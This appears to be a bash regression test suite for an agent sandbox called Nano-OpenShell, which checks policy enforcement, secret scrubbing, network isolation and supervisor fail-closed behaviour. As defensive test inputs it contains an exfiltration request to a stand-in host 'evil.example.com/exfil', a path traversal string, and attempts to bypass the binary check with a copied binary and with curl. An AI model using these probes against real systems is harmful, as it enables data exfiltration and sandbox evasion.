#!/usr/bin/env bash
# Nano-OpenShell End-to-End Automated Regression Test Suite (Milestones 1 - 4)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SOCK_PATH="/tmp/nano-supervisor-regression.sock"
SUP_LOG="/tmp/nano-supervisor-regression.log"
SB_LOG="/tmp/nano-sandbox-regression.log"
TIGHT_POLICY="/tmp/nano-policy-tightened-regression.yaml"
SUP_PID=""
SB_PID=""

cleanup() {
    if [[ -n "${SB_PID}" ]]; then
        local child_pid
        child_pid="$(pgrep -P "${SB_PID}" 2>/dev/null || true)"
        if [[ -n "${child_pid}" ]]; then
            kill -9 "-${child_pid}" "${SB_PID}" 2>/dev/null || true
        else
            kill -9 "${SB_PID}" 2>/dev/null || true
        fi
        wait "${SB_PID}" 2>/dev/null || true
    fi
    if [[ -n "${SUP_PID}" ]]; then
        kill -9 "${SUP_PID}" 2>/dev/null || true
        wait "${SUP_PID}" 2>/dev/null || true
    fi
    rm -f "${SOCK_PATH}" "${SUP_LOG}" "${SB_LOG}" "${TIGHT_POLICY}"
}
trap cleanup EXIT

pass() {
    echo "  [PASS] $1"
}

fail() {
    echo "  [FAIL] $1" >&2
    exit 1
}

assert_eq() {
    local actual="$1"
    local expected="$2"
    local msg="$3"
    if [[ "${actual}" == "${expected}" ]]; then
        pass "${msg} (got '${actual}')"
    else
        fail "${msg} (expected '${expected}', got '${actual}')"
    fi
}

assert_contains() {
    local haystack="$1"
    local needle="$2"
    local msg="$3"
    if grep -Fq "${needle}" <<<"${haystack}"; then
        pass "${msg}"
    else
        echo "  --- Output dump ---" >&2
        echo "${haystack}" >&2
        fail "${msg} (missing '${needle}')"
    fi
}

export NANO_SOCK_PATH="${SOCK_PATH}"
rm -f "${SOCK_PATH}" "${SCRIPT_DIR}/denials.json" "${SCRIPT_DIR}/policy-proposal.yaml"

echo "=================================================================="
echo "Stage 1: Milestone 1 (policy.py) L4 / Binary / L7 Unit Assertions"
echo "=================================================================="

OUT="$(REAL_OPENAI_KEY="sk-unit-123" python3 "${SCRIPT_DIR}/policy.py" check POST https://api.openai.com/v1/chat/completions --binary /usr/bin/python3)"
assert_contains "${OUT}" "ALLOW [rule=openai_agent_inference" "Authorized python3 POST /v1/chat/completions allowed"
assert_contains "${OUT}" "Bearer sk-unit-123" "Credential template rendered for authorized request"

set +e
OUT_TRAVERSAL="$(python3 "${SCRIPT_DIR}/policy.py" check GET "https://api.github.com/repos/../admin" --binary /usr/bin/git 2>&1)"
RC_TRAVERSAL=$?
set -e
assert_eq "${RC_TRAVERSAL}" "1" "Path traversal '/repos/../admin' blocked with exit code 1"
assert_contains "${OUT_TRAVERSAL}" "DENY [L7_HTTP]" "Path normalization prevented glob bypass"

cp /usr/bin/python3 /tmp/fake_python3_nano
chmod +x /tmp/fake_python3_nano
set +e
OUT_TMP_BIN="$(python3 "${SCRIPT_DIR}/policy.py" check POST https://api.openai.com/v1/chat/completions --binary /tmp/fake_python3_nano 2>&1)"
RC_TMP_BIN=$?
set -e
rm -f /tmp/fake_python3_nano
assert_eq "${RC_TMP_BIN}" "1" "Untrusted /tmp binary blocked with exit code 1"
assert_contains "${OUT_TMP_BIN}" "DENY [BINARY_IDENTITY]" "Untrusted execution prefix (/tmp/) rejected at BINARY_IDENTITY stage"

echo ""
echo "=================================================================="
echo "Stage 2: Milestone 2 & 3 (supervisor.py + sandbox.py) Runtime E2E"
echo "=================================================================="

# 2.0 Fail-closed startup lock before supervisor is running
set +e
OUT_LOCK="$(python3 "${SCRIPT_DIR}/sandbox.py" -- python3 -c "print('UNREACHABLE')" 2>&1)"
RC_LOCK=$?
set -e
assert_eq "${RC_LOCK}" "125" "Sandbox refuses to start when Supervisor is offline (exit 125)"
assert_contains "${OUT_LOCK}" "[sandbox][FAIL-CLOSED]" "Fail-closed startup handshake message verified"

# Start Supervisor with live secret
REAL_OPENAI_KEY="sk-live-999" python3 "${SCRIPT_DIR}/supervisor.py" >"${SUP_LOG}" 2>&1 &
SUP_PID=$!
for _ in {1..20}; do
    [[ -S "${SOCK_PATH}" ]] && break
    sleep 0.1
done
[[ -S "${SOCK_PATH}" ]] || fail "Supervisor socket did not appear"
pass "Supervisor started (pid=${SUP_PID}) on ${SOCK_PATH}"

# 2.1 Zero secret leakage + CLONE_NEWNET direct egress block + 200 OK credential injection
OUT_AGENT="$(REAL_OPENAI_KEY="sk-live-999" python3 "${SCRIPT_DIR}/sandbox.py" -- python3 -c '
import json, os, socket, urllib.request, urllib.error

leaked = os.environ.get("REAL_OPENAI_KEY", "<SCRUBBED>")
assert leaked == "<SCRUBBED>", f"Secret leaked: {leaked}"
print("CHECK_ENV_SCRUBBED=OK")

try:
    socket.create_connection(("1.1.1.1", 80), timeout=1.0)
    raise AssertionError("Direct connection unexpectedly succeeded")
except OSError as e:
    print(f"CHECK_NETNS_ISOLATION=OK ({e.errno})")

req = urllib.request.Request(
    "http://api.openai.local:18080/v1/chat/completions",
    data=b"{\"model\":\"gpt-4o\"}",
    method="POST",
)
with urllib.request.urlopen(req) as resp:
    body = json.loads(resp.read().decode("utf-8"))
    print("CHECK_200_AUTH=" + body["received_authorization"])
' 2>&1)"

assert_contains "${OUT_AGENT}" "CHECK_ENV_SCRUBBED=OK" "Host secret REAL_OPENAI_KEY scrubbed from sandbox environment"
assert_contains "${OUT_AGENT}" "CHECK_NETNS_ISOLATION=OK" "CLONE_NEWNET blocked direct raw socket bypass to 1.1.1.1:80"
assert_contains "${OUT_AGENT}" "CHECK_200_AUTH=Bearer sk-live-999" "Authorized python3 request received injected Bearer sk-live-999"

# 2.2 Subprocess /usr/bin/curl blocked by /proc socket-to-binary attribution (403 BINARY_IDENTITY)
OUT_CURL="$(python3 "${SCRIPT_DIR}/sandbox.py" -- curl -s -w "\nHTTP_CODE=%{http_code}" -X POST http://api.openai.local:18080/v1/chat/completions 2>&1)"
assert_contains "${OUT_CURL}" "HTTP_CODE=403" "Spawned /usr/bin/curl inside sandbox received HTTP 403"
assert_contains "${OUT_CURL}" "\"stage\": \"BINARY_IDENTITY\"" "/proc socket-to-inode resolver attributed request to /usr/bin/curl"

# 2.3 Python3 accessing unapproved external domain evil.example.com blocked at L4 (403 L4_HOST_PORT)
OUT_EVIL="$(python3 "${SCRIPT_DIR}/sandbox.py" -- python3 -c '
import urllib.request, urllib.error
try:
    urllib.request.urlopen("http://evil.example.com:18080/exfil")
except urllib.error.HTTPError as e:
    print(f"HTTP_CODE={e.code}")
    print(e.read().decode("utf-8").strip())
' 2>&1)"
assert_contains "${OUT_EVIL}" "HTTP_CODE=403" "Unapproved domain evil.example.com:18080 received HTTP 403"
assert_contains "${OUT_EVIL}" "\"stage\": \"L4_HOST_PORT\"" "Supervisor blocked evil.example.com at L4_HOST_PORT stage"

echo ""
echo "=================================================================="
echo "Stage 3: Milestone 4 (prover.py) Closed-Loop Proposal Verification"
echo "=================================================================="

cat <<'EOF' > "${TIGHT_POLICY}"
version: 1
default_action: deny
network_policies:
  - name: openai_strict_subset
    hosts: ["api.openai.local"]
    ports: [18080]
    allowed_binaries: ["/usr/bin/python3.11"]
    l7_rules:
      - methods: ["POST"]
        paths: ["/v1/chat/completions"]
    credential:
      env_var: "REAL_OPENAI_KEY"
      header: "Authorization"
      value_template: "Bearer ${REAL_OPENAI_KEY}"
EOF

OUT_PROVER_PASS="$(python3 "${SCRIPT_DIR}/prover.py" "${SCRIPT_DIR}/policy.yaml" "${TIGHT_POLICY}" 2>&1)"
assert_contains "${OUT_PROVER_PASS}" "PASS:" "Tightened policy verified as strict subset (exit 0)"

set +e
OUT_PROVER_PROP="$(python3 "${SCRIPT_DIR}/prover.py" "${SCRIPT_DIR}/policy.yaml" "${SCRIPT_DIR}/policy-proposal.yaml" 2>&1)"
RC_PROVER_PROP=$?
set -e
echo "${OUT_PROVER_PROP}"
assert_eq "${RC_PROVER_PROP}" "1" "Auto-generated policy-proposal.yaml blocked from auto-approval (exit 1)"
assert_contains "${OUT_PROVER_PROP}" "BINARY_PRIVILEGE_EXPANSION" "Prover caught /usr/bin/curl binary privilege expansion"
assert_contains "${OUT_PROVER_PROP}" "UNAPPROVED_EGRESS_ENDPOINT" "Prover caught unapproved L4 endpoint evil.example.com:18080"

echo ""
echo "=================================================================="
echo "Stage 4: Supervisor Disconnect -> SIGSTOP Workload Freeze & Cleanup"
echo "=================================================================="

python3 "${SCRIPT_DIR}/sandbox.py" -- python3 -c "import time; time.sleep(30)" >"${SB_LOG}" 2>&1 &
SB_PID=$!
sleep 0.5

CHILD_PID="$(pgrep -P "${SB_PID}")"
[[ -n "${CHILD_PID}" ]] || fail "Failed to locate sandbox workload child PID"

kill "${SUP_PID}"
wait "${SUP_PID}" 2>/dev/null || true
SUP_PID=""
sleep 0.4

CHILD_STAT="$(ps -o stat= -p "${CHILD_PID}" | tr -d ' ')"
ps -o pid,pgid,stat,comm -p "${CHILD_PID}"
assert_contains "${CHILD_STAT}" "T" "Workload process group frozen with SIGSTOP (state=${CHILD_STAT})"

kill -9 "-${CHILD_PID}" "${SB_PID}" 2>/dev/null || true
wait "${SB_PID}" 2>/dev/null || true
SB_PID=""
pass "Frozen process group (-${CHILD_PID}) and sandbox (${CHILD_PID}) cleanly terminated"

echo ""
echo "=================================================================="
echo "ALL NANO-OPENSHELL REGRESSION TESTS PASSED SUCCESSFULLY!"
echo "=================================================================="
